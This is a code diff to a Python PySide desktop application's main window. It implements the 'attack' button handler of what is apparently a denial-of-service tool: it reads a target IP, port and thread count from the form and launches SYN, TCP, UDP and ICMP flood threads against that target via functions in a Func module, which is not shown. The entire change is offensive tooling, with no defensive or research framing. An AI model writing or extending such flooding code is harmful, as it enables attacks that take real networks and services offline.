@@ -7,7 +7,7 @@ Module implementing MainWindow.
 from PySide.QtCore import Slot
 from PySide.QtGui import QMainWindow, QDesktopWidget
 from Ui_MainWindow import Ui_MainWindow
-import Func
+import Func, threading
 
 
 class MainWindow(QMainWindow, Ui_MainWindow):
@@ -35,8 +35,25 @@ class MainWindow(QMainWindow, Ui_MainWindow):
     
     @Slot()
     def on_atkBtn_clicked(self):
-        """
-        Slot documentation goes here.
-        """
-        # TODO: not implemented yet
-        raise NotImplementedError
+        count = int(self.countInput.text())
+        ip = self.ipInput.text()
+        port = int(self.portInput.text())
+        
+        # syn flood
+        if self.synChk.isChecked():
+            for i in xrange(count):
+                threading.Thread(target=Func.synFlood, args=(ip, port)).start()
+        # tcp flood
+        if self.tcpChk.isChecked():
+            for i in xrange(count):
+                threading.Thread(target=Func.tcpFlood, args=(ip, port)).start()
+        
+        # udp flood
+        if self.udpChk.isChecked():
+            for i in xrange(count):
+                threading.Thread(target=Func.udpFlood, args=(ip, port)).start()
+        
+        # icmp flood
+        if self.icmpChk.isChecked():
+            for i in xrange(count):
+                threading.Thread(target=Func.icmpFlood, args=(ip, )).start()
